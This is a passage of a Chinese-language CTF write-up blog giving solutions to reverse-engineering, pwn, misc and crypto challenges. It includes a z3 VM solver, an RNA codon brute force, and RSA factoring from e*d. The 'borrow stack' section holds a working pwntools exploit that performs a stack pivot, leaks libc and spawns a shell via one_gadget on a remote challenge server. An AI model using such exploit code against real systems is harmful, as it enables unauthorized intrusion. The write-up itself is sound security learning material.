f:</span><br><span class="line">    f.write(aes.decrypt(buf))</span><br><span class="line">    f.write(buf2)</span><br></pre></td></tr></table></figure>
<h3 id="easyvm">easyvm</h3>
<p>比较简单的vm题。懒得分析opcode了，写出解析器，直接z3求解</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">opcode = [<span class="number">0x01</span>, <span class="number">0x65</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x66</span>, <span class="number">0xDC</span>, <span class="number">0x02</span>, <span class="number">0x65</span>, <span class="number">0x66</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x65</span>, <span class="number">0x01</span>, <span class="number">0x65</span>, <span class="number">0x01</span>, <span class="number">0x03</span>, <span class="number">0x65</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x65</span>, <span class="number">0x01</span>, <span class="number">0x66</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x65</span>, <span class="number">0x02</span>, <span class="number">0x02</span>, <span class="number">0x65</span>, <span class="number">0x66</span>, <span class="number">0x05</span>, <span class="number">0x65</span>, <span class="number">0x05</span>, <span class="number">0x65</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x65</span>, <span class="number">0x02</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x03</span>, <span class="number">0x02</span>, <span class="number">0x05</span>, <span class="number">0x04</span>, <span class="number">0x04</span>, <span class="number">0x04</span>, <span class="number">0xD7</span>, <span class="number">0x01</span>, <span class="number">0x66</span>, <span class="number">0x05</span>, <span class="number">0x01</span>, <span class="number">0x65</span>, <span class="number">0xE6</span>, <span class="number">0x04</span>, <span class="number">0x66</span>, <span class="number">0x65</span>, <span class="number">0x01</span>, <span class="number">0x05</span>, <span class="number">0x66</span>, <span class="number">0x06</span>, <span class="number">0x06</span>, <span class="number">0x06</span>, <span class="number">0x06</span>, <span class="number">0x01</span>, <span class="number">0x65</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x07</span>, <span class="number">0x65</span>, <span class="number">0x03</span>, <span class="number">0x08</span>, <span class="number">0xE6</span>, <span class="number">0x04</span>, <span class="number">0x09</span>, <span class="number">0xD2</span>, <span class="number">0x01</span>, <span class="number">0x65</span>, <span class="number">0x0A</span>, <span class="number">0x01</span>, <span class="number">0x66</span>, <span class="number">0x09</span>, <span class="number">0x03</span>, <span class="number">0x65</span>, <span class="number">0x66</span>, <span class="number">0x01</span>, <span class="number">0x0A</span>, <span class="number">0x65</span>, <span class="number">0x06</span>, <span class="number">0x0B</span>, <span class="number">0x05</span>, <span class="number">0x0B</span>, <span class="number">0x06</span>, <span class="number">0x0C</span>, <span class="number">0x03</span>, <span class="number">0x0C</span>, <span class="number">0x0C</span>, <span class="number">0x01</span>, <span class="number">0x65</span>, <span class="number">0x0D</span>, <span class="number">0x01</span>, <span class="number">0x66</span>, <span class="number">0x0E</span>, <span class="number">0x03</span>, <span class="number">0x66</span>, <span class="number">0x65</span>, <span class="number">0x01</span>, <span class="number">0x0E</span>, <span class="number">0x66</span>, <span class="number">0x03</span>, <span class="number">0x65</span>, <span class="number">0x66</span>, <span class="number">0x01</span>, <span class="number">0x0D</span>, <span class="number">0x65</span>, <span class="number">0x01</span>, <span class="number">0x65</span>, <span class="number">0x0F</span>, <span class="number">0x01</span>, <span class="number">0x66</span>, <span class="number">0x10</span>, <span class="number">0x03</span>, <span class="number">0x66</span>, <span class="number">0x65</span>, <span class="number">0x01</span>, <span class="number">0x10</span>, <span class="number">0x66</span>, <span class="number">0x04</span>, <span class="number">0x66</span>, <span class="number">0x65</span>, <span class="number">0x01</span>, <span class="number">0x0F</span>, <span class="number">0x66</span>, <span class="number">0x06</span>, <span class="number">0x11</span>, <span class="number">0x06</span>, <span class="number">0x11</span>, <span class="number">0x04</span>, <span class="number">0x12</span>, <span class="number">0xF0</span>, <span class="number">0x04</span>, <span class="number">0x12</span>, <span class="number">0xF0</span>, <span class="number">0xFF</span>]</span><br><span class="line">cipher = [<span class="number">0x72</span>, <span class="number">0xDE</span>, <span class="number">0xC1</span>, <span class="number">0xD4</span>, <span class="number">0x6D</span>, <span class="number">0x58</span>, <span class="number">0x6B</span>, <span class="number">0x2D</span>, <span class="number">0x87</span>, <span class="number">0x69</span>, <span class="number">0xC8</span>, <span class="number">0x6E</span>, <span class="number">0xDC</span>, <span class="number">0x47</span>, <span class="number">0xD3</span>, <span class="number">0x61</span>, <span class="number">0xC6</span>, <span class="number">0x71</span>, <span class="number">0x29</span>, <span class="number">0x7D</span>]</span><br><span class="line"><span class="built_in">input</span> = <span class="built_in">list</span>(<span class="string">b&#x27;1&#x27;</span>*<span class="number">20</span>)</span><br><span class="line"><span class="built_in">input</span> = [BitVec(<span class="string">&#x27;x%d&#x27;</span>%i, <span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>)]</span><br><span class="line">x = [<span class="built_in">input</span>[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>)]</span><br><span class="line">R = [<span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line">ip = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> ip &lt; <span class="built_in">len</span>(opcode):</span><br><span class="line">    <span class="keyword">if</span> opcode[ip] == <span class="number">0xff</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> opcode[ip] &lt;= <span class="number">4</span>:</span><br><span class="line">        dst = opcode[ip+<span class="number">1</span>]</span><br><span class="line">        src = opcode[ip+<span class="number">2</span>]</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> src == <span class="number">0x65</span> <span class="keyword">or</span> src == <span class="number">0x66</span>:</span><br><span class="line">            src = R[src-<span class="number">0x65</span>]</span><br><span class="line">        <span class="keyword">elif</span> src &gt; <span class="number">0xC7</span>:</span><br><span class="line">            src += <span class="number">0x38</span></span><br><span class="line">            src &amp;= <span class="number">0xff</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            src = <span class="built_in">input</span>[src]</span><br><span class="line">        <span class="keyword">if</span> opcode[ip] == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">if</span> dst &gt;= <span class="number">0x65</span>:</span><br><span class="line">                R[dst-<span class="number">0x65</span>] = src</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">input</span>[dst] = src</span><br><span class="line">        <span class="keyword">elif</span> opcode[ip] == <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">if</span> dst &gt;= <span class="number">0x65</span>:</span><br><span class="line">                R[dst-<span class="number">0x65</span>] ^= src</span><br><span class="line">                R[dst-<span class="number">0x65</span>]&amp;= <span class="number">0xff</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">input</span>[dst] ^= src</span><br><span class="line">                <span class="built_in">input</span>[dst]&amp;= <span class="number">0xff</span></span><br><span class="line">        <span class="keyword">elif</span> opcode[ip] == <span class="number">3</span>:</span><br><span class="line">            <span class="keyword">if</span> dst &gt;= <span class="number">0x65</span>:</span><br><span class="line">                R[dst-<span class="number">0x65</span>] += src</span><br><span class="line">                R[dst-<span class="number">0x65</span>]&amp;= <span class="number">0xff</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">input</span>[dst] += src</span><br><span class="line">                <span class="built_in">input</span>[dst]&amp;= <span class="number">0xff</span></span><br><span class="line">        <span class="keyword">elif</span> opcode[ip] == <span class="number">4</span>:</span><br><span class="line">            <span class="keyword">if</span> dst &gt;= <span class="number">0x65</span>:</span><br><span class="line">                R[dst-<span class="number">0x65</span>] -= src</span><br><span class="line">                R[dst-<span class="number">0x65</span>]&amp;= <span class="number">0xff</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">input</span>[dst] -= src</span><br><span class="line">                <span class="built_in">input</span>[dst]&amp;= <span class="number">0xff</span></span><br><span class="line">        ip += <span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> opcode[ip] == <span class="number">5</span>:</span><br><span class="line">        dst = opcode[ip+<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">if</span> dst == <span class="number">0x65</span> <span class="keyword">or</span> dst == <span class="number">0x66</span>:</span><br><span class="line">            R[dst-<span class="number">0x65</span>]+=<span class="number">1</span></span><br><span class="line">            R[dst-<span class="number">0x65</span>]&amp;= <span class="number">0xff</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">input</span>[dst]+=<span class="number">1</span></span><br><span class="line">            <span class="built_in">input</span>[dst]&amp;=<span class="number">0xff</span></span><br><span class="line">        ip += <span class="number">2</span></span><br><span class="line">    <span class="keyword">elif</span> opcode[ip] == <span class="number">6</span>:</span><br><span class="line">        dst = opcode[ip+<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">if</span> dst == <span class="number">0x65</span> <span class="keyword">or</span> dst == <span class="number">0x66</span>:</span><br><span class="line">            R[dst-<span class="number">0x65</span>]-=<span class="number">1</span></span><br><span class="line">            R[dst-<span class="number">0x65</span>]&amp;= <span class="number">0xff</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">input</span>[dst]-=<span class="number">1</span></span><br><span class="line">            <span class="built_in">input</span>[dst]&amp;=<span class="number">0xff</span></span><br><span class="line">        ip += <span class="number">2</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">s = Solver()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">    s.add(<span class="built_in">input</span>[i] == cipher[i])</span><br><span class="line"><span class="built_in">print</span>(s.check())</span><br><span class="line">m = s.model()</span><br><span class="line">s = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> x:</span><br><span class="line">    s += <span class="built_in">chr</span>(m[i].as_long())</span><br><span class="line"><span class="built_in">print</span>(s)</span><br></pre></td></tr></table></figure>
<h3 id="analysis-of-viruses">Analysis of viruses</h3>
<p>还以为是病毒分析，结果却是是病毒分析。</p>
<p>输入一串RNA序列，然后程序转录得到蛋白质，与指定蛋白质序列进行校验。</p>
<p>本来是非常ez的题，但是漏看了几个蛋白质对应的不止4个RNA序列，导致爆破不出正确答案。然后出题人没想到结果非常多会撞哈希，导致各种多解。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line">m = [[<span class="string">&quot;UAC&quot;</span>], [<span class="string">&quot;ACA&quot;</span>, <span class="string">&quot;ACG&quot;</span>], [<span class="string">&quot;AAC&quot;</span>, <span class="string">&quot;AAU&quot;</span>, <span class="string">&quot;GAA&quot;</span>, <span class="string">&quot;GAU&quot;</span>, <span class="string">&quot;GAG&quot;</span>, <span class="string">&quot;GAC&quot;</span>], [<span class="string">&quot;CGA&quot;</span>, <span class="string">&quot;CGU&quot;</span>, <span class="string">&quot;CGG&quot;</span>, <span class="string">&quot;CGC&quot;</span>], [<span class="string">&quot;UCU&quot;</span>, <span class="string">&quot;UCC&quot;</span>], [<span class="string">&quot;AAC&quot;</span>, <span class="string">&quot;AAU&quot;</span>, <span class="string">&quot;GAA&quot;</span>, <span class="string">&quot;GAU&quot;</span>, <span class="string">&quot;GAG&quot;</span>, <span class="string">&quot;GAC&quot;</span>], [<span class="string">&quot;AAA&quot;</span>, <span class="string">&quot;AAG&quot;</span>], [<span class="string">&quot;UCA&quot;</span>, <span class="string">&quot;UCG&quot;</span>, <span class="string">&quot;AGA&quot;</span>, <span class="string">&quot;AGU&quot;</span>, <span class="string">&quot;AGG&quot;</span>, <span class="string">&quot;AGC&quot;</span>], [<span class="string">&quot;UAA&quot;</span>, <span class="string">&quot;UAU&quot;</span>, <span class="string">&quot;UAG&quot;</span>], [<span class="string">&quot;AAC&quot;</span>, <span class="string">&quot;AAU&quot;</span>, <span class="string">&quot;GAA&quot;</span>, <span class="string">&quot;GAU&quot;</span>, <span class="string">&quot;GAG&quot;</span>, <span class="string">&quot;GAC&quot;</span>], [<span class="string">&quot;UUA&quot;</span>, <span class="string">&quot;UUG&quot;</span>], [<span class="string">&quot;CAA&quot;</span>, <span class="string">&quot;CAU&quot;</span>, <span class="string">&quot;CAG&quot;</span>, <span class="string">&quot;CAC&quot;</span>], [<span class="string">&quot;ACA&quot;</span>, <span class="string">&quot;ACG&quot;</span>], [<span class="string">&quot;CCA&quot;</span>, <span class="string">&quot;CCU&quot;</span>, <span class="string">&quot;CCG&quot;</span>, <span class="string">&quot;CCC&quot;</span>], [<span class="string">&quot;UUU&quot;</span>, <span class="string">&quot;UUC&quot;</span>], [<span class="string">&quot;AAC&quot;</span>, <span class="string">&quot;AAU&quot;</span>, <span class="string">&quot;GAA&quot;</span>, <span class="string">&quot;GAU&quot;</span>, <span class="string">&quot;GAG&quot;</span>, <span class="string">&quot;GAC&quot;</span>], [<span class="string">&quot;AUU&quot;</span>, <span class="string">&quot;AUC&quot;</span>, <span class="string">&quot;ACU&quot;</span>]]</span><br><span class="line">res = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pair</span>(<span class="params">s</span>):</span><br><span class="line">    res = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        <span class="keyword">if</span> i == <span class="string">&quot;A&quot;</span>:</span><br><span class="line">            res += <span class="string">&quot;U&quot;</span></span><br><span class="line">        <span class="keyword">elif</span> i == <span class="string">&quot;U&quot;</span>:</span><br><span class="line">            res += <span class="string">&quot;A&quot;</span></span><br><span class="line">        <span class="keyword">elif</span> i == <span class="string">&quot;G&quot;</span>:</span><br><span class="line">            res += <span class="string">&quot;C&quot;</span></span><br><span class="line">        <span class="keyword">elif</span> i == <span class="string">&quot;C&quot;</span>:</span><br><span class="line">            res += <span class="string">&quot;G&quot;</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"><span class="keyword">for</span> i0 <span class="keyword">in</span> m[<span class="number">0</span>]:</span><br><span class="line">    <span class="keyword">for</span> i1 <span class="keyword">in</span> m[<span class="number">1</span>]:</span><br><span class="line">        <span class="keyword">for</span> i2 <span class="keyword">in</span> m[<span class="number">2</span>]:</span><br><span class="line">            <span class="keyword">for</span> i3 <span class="keyword">in</span> m[<span class="number">3</span>]:</span><br><span class="line">                <span class="keyword">for</span> i4 <span class="keyword">in</span> m[<span class="number">4</span>]:</span><br><span class="line">                    <span class="keyword">for</span> i5 <span class="keyword">in</span> m[<span class="number">5</span>]:</span><br><span class="line">                        <span class="keyword">for</span> i6 <span class="keyword">in</span> m[<span class="number">6</span>]:</span><br><span class="line">                            <span class="keyword">for</span> i7 <span class="keyword">in</span> m[<span class="number">7</span>]:</span><br><span class="line">                                <span class="keyword">for</span> i8 <span class="keyword">in</span> m[<span class="number">8</span>]:</span><br><span class="line">                                    <span class="keyword">for</span> i9 <span class="keyword">in</span> m[<span class="number">9</span>]:</span><br><span class="line">                                        <span class="keyword">for</span> i10 <span class="keyword">in</span> m[<span class="number">10</span>]:</span><br><span class="line">                                            <span class="keyword">for</span> i11 <span class="keyword">in</span> m[<span class="number">11</span>]:</span><br><span class="line">                                                <span class="keyword">for</span> i12 <span class="keyword">in</span> m[<span class="number">12</span>]:</span><br><span class="line">                                                    <span class="keyword">for</span> i13 <span class="keyword">in</span> m[<span class="number">13</span>]:</span><br><span class="line">                                                        <span class="keyword">for</span> i14 <span class="keyword">in</span> m[<span class="number">14</span>]:</span><br><span class="line">                                                            <span class="keyword">for</span> i15 <span class="keyword">in</span> m[<span class="number">15</span>]:</span><br><span class="line">                                                                <span class="keyword">for</span> i16 <span class="keyword">in</span> m[<span class="number">16</span>]:</span><br><span class="line">                                                                    res = i0+i1+i2+i3+i4+i5+i6+i7+i8+i9+i10+i11+i12+i13+i14+i15+i16</span><br><span class="line">                                                                    res = pair(res)</span><br><span class="line">                                                                    s = md5(res.encode()).hexdigest()</span><br><span class="line">                                                                    <span class="keyword">if</span> s[<span class="number">0</span>:<span class="number">16</span>] == <span class="string">&#x27;e03657e01aa92999&#x27;</span>:</span><br><span class="line">                                                                        <span class="built_in">print</span>(s)</span><br><span class="line">                                                                        <span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure>
<p>渣代码，这种一直不知道怎么写QAQ</p>
<h3 id="veryeasyre">veryeasyRE</h3>
<p>一开始很明显一个数独。而且这个数非常眼熟，好像之前哪个比赛用过。。。</p>
<p>然后一个没见过的加密算法。搜一下常量搜到zuc，祖冲之加密算法。输入32位字符串，偶数下标作为key加密。</p>
<p>逻辑不难，但是找不到key。题目自带提示输入的数独解应该跟key有关，但是实在没找到。。。</p>
<p>脚本不贴了，百度百科有祖冲之加密算法的实现。找到key就可以解了。。。</p>
<p>好吧复盘看了下wp，在输入数独之后一个不起眼的地方把输入的数列异或了16个字节，然后根据提示这个就是key。。。</p>
<p>只能怪看题不仔细吧2333</p>
<h2 id="pwn">Pwn</h2>
<h3 id="borrow-stack">borrow stack</h3>
<p>简单的栈溢出，栈转移到bss，提前布置leak出libc地址，然后栈溢出one_gadget</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;DEBUG&quot;</span></span><br><span class="line">p = remote(<span class="string">&quot;123.56.85.29&quot;</span>,<span class="string">&quot;3635&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;want\n&quot;</span>)</span><br><span class="line">basebp = <span class="number">0x0000000000601080</span> + <span class="number">0xc0</span></span><br><span class="line">leaveret = <span class="number">0x0000000000400699</span></span><br><span class="line">main = <span class="number">0x0000000000400626</span></span><br><span class="line">poprdi = <span class="number">0x0000000000400703</span></span><br><span class="line">puts_got = <span class="number">0x0000000000601018</span></span><br><span class="line">call_puts = <span class="number">0x00000000004004E0</span></span><br><span class="line">pause()</span><br><span class="line">p.send(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x60</span> + p64(basebp) + p64(leaveret))</span><br><span class="line">pause()</span><br><span class="line">p.sendline(<span class="string">&quot;&quot;</span>.ljust(<span class="number">0xc8</span>, <span class="string">&quot;\x00&quot;</span>) + p64(poprdi) + p64(puts_got) + p64(call_puts) + p64(main))</span><br><span class="line">p.recvuntil(<span class="string">&quot; now!\n&quot;</span>)</span><br><span class="line">puts_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">libc_base = puts_addr - <span class="number">0x6F690</span></span><br><span class="line">log.success(<span class="string">&quot;libc_base:0x%x&quot;</span>%libc_base)</span><br><span class="line">one_gadget = libc_base + <span class="number">0x45216</span></span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>*<span class="number">0x68</span> + p64(one_gadget))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="misc">misc</h2>
<p>签到题不写了</p>
<h3 id="code_in_morse">code_in_morse</h3>
<p>解莫斯电码，base32，出一个pdf417条码，扫出来一张图片，f5-steganography出flag</p>
<h2 id="crypto">Crypto</h2>
<h3 id="simple_math">simple_math</h3>
<p>借助谷歌，成功做出这道题</p>
<p>第一部分</p>
<p>类似威尔逊定理，试了下200以内的质数，结果不是1就是n-1，猜测一下就是1或n-1。原理不知道。</p>
<p>谷歌到一个公式</p>
<p><span class="math display">\[
(p-k)!(k-1)!\equiv(-1)^k\quad mod \quad p
\]</span> 求出N2，得到p</p>
<p>第二部分谷歌一下发现一个用e*d求q的算法。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line">A = <span class="number">17837832555368308689786098708027973117794970348203719986383141676940062201987761202777419099369816828481341695174601689881519219806887761505932440928699539</span></span><br><span class="line">C = <span class="number">17837832555368308689786098708027973117794970348203719986383141676940062201987761202777419099369816828481341695174601689881519219806887761505932440928632158</span></span><br><span class="line">n = <span class="number">641840878174982655326850312496169636378455577115347500957057267640600977102280072913438154955029114771051709087809927454279064916870408880749853740239718248642560401110078626938726443568692572803490357236810832674229312155746539894173791356805341671586393273678865952155249500341932905426105470392415353610397045835698808163501258474762363712287163328526252399904787053101799058499120606154737990300449437479282435046167055009692493712202386368849122605419812883126887833074654434641607372149411668612504466768080306339558792828063148576123738980431264608446603326193849200810553196864085478463086993422774817059853949748247896512719994166090254440232652496451104455075071560127966288341488523110118075041150491577844082366096788215046025436488554795141938458493258409150407281215473354273599246314944034941237527510171900646139987019380766717951556307441871365874564881565374638513827494801194029940895912077179028101890662760455651864691251980479400416227456995236912364846811949410786643764713673564022863007331006828562341241738846980912184411395632790556038655767763976115640962139547171909279164623846000835333857705944581269631616760405747716520672142021728850694537269211784578408601266217928819863736428173736140161826738813</span></span><br><span class="line">ed = <span class="number">534634151124279413732259524933495479098721499860333007593590357554306358799023578194908726136928354695079848972480649724456088941906723794709312712191247045425297126517594344899286925836796680956816064609089090503579894117057252969264121691849003333804607728687046319857910698511132867345476426833313854575436202087209472834349551593011689755514138197238955298350562839877955001729313715223006875793667570760703418551390980455326976431990257513342820095246552412287184147009729875110446230949824384166464485840066906862476445054049749692262294734099027915906839812656254886862402603631321290156949953461665657610306709058617222159635281067103921037090824796905267992798715820128476225045484793453227511548884919811033318570386881936137713666127231317606909893143214808788822341878386939352957962886113639632559883992777992209148001401767753558732492213499792179169681405789041595765504039612494711563472885565786566625643290565526077483663342991770220261962082523632475094223960703649343802215392245948547397211539801128773253646005228684994277460378625729491412757387260415740823541731482803143732545953736392746596116269262129834845033889284145602522548909021358829175225208236295389454408336909318816490014229410357900614079212880259236238467905</span></span><br><span class="line">ciphertext = <span class="number">183288709028723976658160448336519698700398459340947322152692016513169599029222514445118399653225032641541100129985101994918772329046946295962244096646038598600865786096896989355554955041779941259413115779915405468832327321189345505283184153652727885422718280179025251186380977491993641792341259672566237363655347151343020354489781675539571788934759950303331075098574759853670802171054084321131703969504258663714257549258635956184694450566287845760701724862418909255930636298209146539578608879672058346906370035692078859844402832322545368347681121504910035471822137023626638953992968941166744998545450662434365836169688461834868137046528403401190395486501502489519341656581057940794141420456022102711505759074332049547354944074402136763186087462931985682293826106916791831371302</span></span><br><span class="line"></span><br><span class="line">B = (A-<span class="number">1</span>)//<span class="number">2</span></span><br><span class="line">N1 = <span class="number">1</span></span><br><span class="line"><span class="comment"># N1 = A-1</span></span><br><span class="line">k = A-C</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_N</span>(<span class="params">A,B</span>):</span><br><span class="line">    result=<span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,B+<span class="number">1</span>):</span><br><span class="line">        result=(result*i)%A</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">k1 = gen_N(A, (k-<span class="number">1</span>))</span><br><span class="line">N2 = ((A-<span class="number">1</span>) * inverse(k1, A))%A</span><br><span class="line">seed1=<span class="number">2019</span>*N1+<span class="number">2020</span>*N2</span><br><span class="line">p = sympy.nextprime(seed1)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">def factor_from_d(n, ed):</span></span><br><span class="line"><span class="string">  kphi = ed - 1</span></span><br><span class="line"><span class="string">  # remove powers of 2 from phi multiple</span></span><br><span class="line"><span class="string">  kphi = kphi // gcd(kphi, 2^int(log(n, 2)))</span></span><br><span class="line"><span class="string">  while True:</span></span><br><span class="line"><span class="string">    # random base</span></span><br><span class="line"><span class="string">    b = randint(0, n)</span></span><br><span class="line"><span class="string">    x = power_mod(b, kphi, n)</span></span><br><span class="line"><span class="string">    # try to find a nontrivial square root of 1</span></span><br><span class="line"><span class="string">    while x != 1 and x != n - 1:</span></span><br><span class="line"><span class="string">      # found one!</span></span><br><span class="line"><span class="string">      # x^2 = 1 (mod n)</span></span><br><span class="line"><span class="string">      # x^2 - 1 = (x + 1)*(x - 1) (mod n)</span></span><br><span class="line"><span class="string">      if x^2 % n == 1:</span></span><br><span class="line"><span class="string">        return gcd(n, x + 1), gcd(n, x - 1)</span></span><br><span class="line"><span class="string">      x = x^2 % n</span></span><br><span class="line"><span class="string">p, q = factor_from_d(n, ed)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">p, q = 